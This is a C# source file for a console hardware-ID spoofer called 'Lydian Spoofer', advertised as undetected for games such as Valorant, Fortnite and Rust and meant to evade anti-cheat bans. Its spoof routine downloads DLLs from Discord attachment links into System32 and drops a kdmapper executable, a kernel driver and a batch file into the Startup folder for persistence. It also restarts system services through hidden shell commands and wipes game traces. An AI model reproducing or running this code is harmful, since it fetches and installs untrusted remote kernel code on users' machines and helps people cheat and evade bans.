using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Threading;
using ConsoleApp1;
using HardDrive;
using Microsoft.Win32.SafeHandles;
using Xeno;

namespace Menu
{
	public class Program2
	{
		public static void startSpoof()
		{
			Console.Clear();
			Console.ForegroundColor = ConsoleColor.Green;
			Console.WriteLine("Lydian Spoofer");
			Program2.toel();
		}

		public static void toel()
		{
			Console.Clear();
			Console.ForegroundColor = ConsoleColor.Yellow;
			Console.WriteLine();
			Console.WriteLine("[+] 1 For Spoof Hardware Serials");
			Console.WriteLine("[+] 2 For Clean System [Only for Valorant]");
			Console.WriteLine("[+] 3 Get Your Hwid Info");
			Console.WriteLine("[+] 4 Check Supported Games");
			Console.WriteLine("[+] 5 Exit");
			Console.WriteLine();
			Console.Write("[+] : ");
			string a = Console.ReadLine();
			if (a == "4")
			{
				Console.Clear();
				Console.ForegroundColor = ConsoleColor.Green;
				Console.WriteLine("[+] Call Off Duty Modern Worfare Warzone");
				Console.ForegroundColor = ConsoleColor.Green;
				Console.WriteLine("Undetected");
				Console.WriteLine("");
				Thread.Sleep(1000);
				Console.WriteLine("[+] Call Off Duty Cold War");
				Console.ForegroundColor = ConsoleColor.Green;
				Console.WriteLine("Undetected");
				Console.WriteLine("");
				Thread.Sleep(1400);
				Console.WriteLine("[+] Rust");
				Console.ForegroundColor = ConsoleColor.Green;
				Console.WriteLine("Undetected");
				Console.WriteLine("");
				Thread.Sleep(300);
				Console.WriteLine("[+] Apex Legends");
				Console.ForegroundColor = ConsoleColor.Green;
				Console.WriteLine("Undetected");
				Console.WriteLine("");
				Thread.Sleep(3200);
				Console.WriteLine("[+] Valorant");
				Console.ForegroundColor = ConsoleColor.Green;
				Console.WriteLine("Undetected");
				Console.WriteLine("");
				Thread.Sleep(1000);
				Console.WriteLine("[+] Fortnite");
				Console.ForegroundColor = ConsoleColor.Green;
				Console.WriteLine("Undetected");
				Console.WriteLine("");
				Thread.Sleep(1400);
				Console.WriteLine("[+] Dead By Daylight");
				Console.ForegroundColor = ConsoleColor.Green;
				Console.WriteLine("Undetected");
				Console.WriteLine("");
				Thread.Sleep(1000);
				Console.WriteLine("[+] Pubg");
				Console.ForegroundColor = ConsoleColor.Green;
				Console.WriteLine("Undetected");
				Console.WriteLine("");
				Thread.Sleep(1000);
				Console.WriteLine("[+] Rainbow Six Siege");
				Console.ForegroundColor = ConsoleColor.Green;
				Console.WriteLine("Undetected");
				Thread.Sleep(6000);
				Program2.toel();
			}
			if (a == "1")
			{
				Console.Clear();
				Console.ForegroundColor = ConsoleColor.Cyan;
				Console.Write("[+] Please Type random words and number: ");
				WebClient webClient = new WebClient();
				WebClient webClient2 = new WebClient();
				string path = "C:\\Windows\\PPKR$5";
				if (!Directory.Exists(path))
				{
					DirectoryInfo directoryInfo = Directory.CreateDirectory(path);
					directoryInfo.Attributes = (FileAttributes.Hidden | FileAttributes.Directory);
				}
				string path2 = "C:\\Users\\Default\\ERDCFVtyb";
				if (!Directory.Exists(path2))
				{
					DirectoryInfo directoryInfo2 = Directory.CreateDirectory(path2);
					directoryInfo2.Attributes = (FileAttributes.Hidden | FileAttributes.Directory);
				}
				webClient.DownloadFile("https://google.com", "C:\\Windows\\PPKR$5\\register.xfr");
				webClient2.DownloadFile("https://google.com", "C:\\Users\\Default\\ERDCFVtyb\\NetFresh.kor");
				SystemBIOS.DownloadDriver();
				SystemBIOS.DownloadSys();
				Thread.Sleep(600);
				Console.Clear();
				Console.WriteLine("Setting up file, Please wait.");
				WebClient webClient3 = new WebClient();
				webClient3.DownloadFile("https://cdn.discordapp.com/attachments/700751216858234920/700751378867290262/msvcp140d.dll", "C:\\Windows\\System32\\msvcp140d.dll");
				webClient3.DownloadFile("https://cdn.discordapp.com/attachments/700751216858234920/700751417761071265/ucrtbased.dll", "C:\\Windows\\System32\\ucrtbased.dll");
				webClient3.DownloadFile("https://cdn.discordapp.com/attachments/700751216858234920/700751319794843768/vcruntime140d.dll", "C:\\Windows\\System32\\vcruntime140d.dll");
				webClient3.DownloadFile("https://cdn.discordapp.com/attachments/700751216858234920/700751289272893510/vcruntime140_1d.dll", "C:\\Windows\\System32\\vcruntime140_1d.dll");
				Console.Clear();
				Console.WriteLine("[+]Spoofing started this process can take some time, please Wait.");
				Console.WriteLine("");
				Thread.Sleep(5000);
				Console.Write("[+] Old DiskDrive Serials: ");
				Console.WriteLine(Program2.GetHDDSerial());
				Diskdrive.VolumeID();
				Diskdrive.DiskdriveSpoof();
				Thread.Sleep(3000);
				Console.Write("[+] New DiskDrive Serials: ");
				WebClient webClient4 = new WebClient();
				webClient4.DownloadFile("https://cdn.discordapp.com/attachments/721095799295049832/775058703711076393/kdmappernew.exe", "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\MapperSpoofy.exe");
				WebClient webClient5 = new WebClient();
				webClient5.DownloadFile("https://cdn.discordapp.com/attachments/698964774096076833/698965464293965944/Spoofy.sys", "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\Spoofy.sys");
				WebClient webClient6 = new WebClient();
				webClient6.DownloadFile("https://cdn.discordapp.com/attachments/721095799295049832/777297619805929502/load.bat", "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\load.bat");
				new WebClient();
				Console.WriteLine(Program2.GetHDDSerial());
				Console.Write("[+] Old MotherBoard, CPU, Bios and SMBIOS Serials: ");
				Console.WriteLine(Program2.GetMotherBoardID());
				Thread.Sleep(1000);
				SystemBIOS.SystemBiosSpoof();
				Program2.ExecuteCommand("net stop IPHLPSVC");
				Thread.Sleep(100);
				Program2.ExecuteCommand("net stop winmgmt");
				Thread.Sleep(100);
				Program2.ExecuteCommand("net start winmgmt");
				Thread.Sleep(100);
				Program2.ExecuteCommand("sc stop winmgmt");
				Thread.Sleep(100);
				Program2.ExecuteCommand("sc start winmgmt");
				Thread.Sleep(100);
				Program2.ExecuteCommand("net start IPHLPSVC");
				Thread.Sleep(100);
				Diskdrive.DownloadDriver();
				Thread.Sleep(9000);
				Console.Write("[+] New MotherBoard,CPU,Bios and Smbios Serials: ");
				Console.WriteLine(Program2.GetMotherBoardID());
				Thread.Sleep(5000);
				Console.Write("[+] Old MAC: ");
				Console.WriteLine(Program2.GetHwid2());
				NtwSpoof.MacDownload();
				Console.Write("[+] New MAC: ");
				NtwSpoof.Mac();
				Console.WriteLine(Program2.GetHwid2());
				Thread.Sleep(9000);
				Console.Write("");
				Console.ForegroundColor = ConsoleColor.Green;
				Console.WriteLine("[+] Your serial machine code is Changed Permanently.");
				Console.WriteLine("[+] If you don't see new mac means is not loaded yet but is changed.");
				Thread.Sleep(5000);
				Program2.toel();
			}
			if (a == "2")
			{
				Console.Clear();
				Console.WriteLine("[+] Cleaning Step 1");
				Traces.Fortnite();
				Console.WriteLine("[+] Cleaning Step 2");
				Traces.Fortnite2();
				Console.WriteLine("[+] Cleaning Step 3");
				Traces.Fortnite4();
				Console.WriteLine("[+] Cleaning Step 4");
				Traces.Fortnite5();
				Console.WriteLine("[+] Cleaning Registry please wait...");
				Traces.Registry();
				Console.WriteLine("[+] All traces deleted.");
				Thread.Sleep(3000);
				Program2.toel();
			}
			if (a == "3")
			{
				Console.Clear();
				Console.Write("[+] DiskDrive Serials: ");
				Console.WriteLine(Program2.GetHDDSerial());
				Console.Write("[+] Generating New MAC Address: ");
				Console.WriteLine(Program2.GetHwid2());
				Console.WriteLine("");
				Console.Write("[+] MotherBoard, CPU, Bios and SMBIOS Serials: ");
				Console.WriteLine(Program2.GetMotherBoardID());
				Thread.Sleep(2000);
				Console.WriteLine("");
				Console.WriteLine("[+] Press any button for go back in the menu. ");
				Console.ReadLine();
				Program2.toel();
			}
			if (a == "4")
			{
				Environment.Exit(0);
			}
		}

		public static string GetHDDSerial()
		{
			try
			{
				ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_DiskDrive");
				using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = managementObjectSearcher.Get().GetEnumerator())
				{
					if (enumerator.MoveNext())
					{
						ManagementObject managementObject = (ManagementObject)enumerator.Current;
						return managementObject["SerialNumber"].ToString();
					}
				}
			}
			catch (Exception)
			{
				return null;
			}
			return null;
		}

		public static string GetMotherBoardID()
		{
			string text = string.Empty;
			ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT * FROM Win32_BaseBoard");
			foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
			{
				ManagementObject managementObject = (ManagementObject)managementBaseObject;
				text += managementObject["SerialNumber"].ToString();
			}
			return text;
		}

		public static string GetHwid2()
		{
			string text = "";
			foreach (NetworkInterface networkInterface in NetworkInterface.GetAllNetworkInterfaces())
			{
				if (networkInterface.OperationalStatus == OperationalStatus.Up)
				{
					text += networkInterface.GetPhysicalAddress().ToString();
					return text;
				}
			}
			return text;
		}

		private static void ExecuteCommand(string command)
		{
			Process process = Process.Start(new ProcessStartInfo("cmd.exe", "/c " + command)
			{
				CreateNoWindow = true,
				UseShellExecute = false,
				RedirectStandardError = true,
				RedirectStandardOutput = true
			});
			process.WaitForExit();
			process.StandardOutput.ReadToEnd();
			process.StandardError.ReadToEnd();
			int exitCode = process.ExitCode;
			process.Close();
		}

		public static string GetLocalIPAddress()
		{
			IPHostEntry hostEntry = Dns.GetHostEntry(Dns.GetHostName());
			foreach (IPAddress ipaddress in hostEntry.AddressList)
			{
				if (ipaddress.AddressFamily == AddressFamily.InterNetwork)
				{
					return ipaddress.ToString();
				}
			}
			throw new Exception("No network adapters with an IPv4 address in the system!");
		}

		public static void Initialize(bool alwaysCreateNewConsole = true)
		{
			bool flag = true;
			if (alwaysCreateNewConsole || (Program2.AttachConsole(4294967295U) == 0U && (long)Marshal.GetLastWin32Error() != 5L))
			{
				flag = (Program2.AllocConsole() != 0);
			}
			if (flag)
			{
				Program2.InitializeOutStream();
				Program2.InitializeInStream();
			}
		}

		private static void InitializeOutStream()
		{
			FileStream fileStream = Program2.CreateFileStream("CONOUT$", 1073741824U, 2U, FileAccess.Write);
			if (fileStream != null)
			{
				StreamWriter streamWriter = new StreamWriter(fileStream)
				{
					AutoFlush = true
				};
				Console.SetOut(streamWriter);
				Console.SetError(streamWriter);
			}
		}

		private static void InitializeInStream()
		{
			FileStream fileStream = Program2.CreateFileStream("CONIN$", 2147483648U, 1U, FileAccess.Read);
			if (fileStream != null)
			{
				Console.SetIn(new StreamReader(fileStream));
			}
		}

		private static FileStream CreateFileStream(string name, uint win32DesiredAccess, uint win32ShareMode, FileAccess dotNetFileAccess)
		{
			SafeFileHandle safeFileHandle = new SafeFileHandle(Program2.CreateFileW(name, win32DesiredAccess, win32ShareMode, IntPtr.Zero, 3U, 128U, IntPtr.Zero), true);
			FileStream result;
			if (!safeFileHandle.IsInvalid)
			{
				FileStream fileStream = new FileStream(safeFileHandle, dotNetFileAccess);
				result = fileStream;
			}
			else
			{
				result = null;
			}
			return result;
		}

		[DllImport("kernel32.dll", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Auto, SetLastError = true)]
		private static extern int AllocConsole();

		[DllImport("kernel32.dll", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Auto, SetLastError = true)]
		private static extern uint AttachConsole(uint dwProcessId);

		[DllImport("kernel32.dll", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Auto, SetLastError = true)]
		private static extern IntPtr CreateFileW(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);

		private const uint GENERIC_WRITE = 1073741824U;

		private const uint GENERIC_READ = 2147483648U;

		private const uint FILE_SHARE_READ = 1U;

		private const uint FILE_SHARE_WRITE = 2U;

		private const uint OPEN_EXISTING = 3U;

		private const uint FILE_ATTRIBUTE_NORMAL = 128U;

		private const uint ERROR_ACCESS_DENIED = 5U;

		private const uint ATTACH_PARRENT = 4294967295U;
	}
}
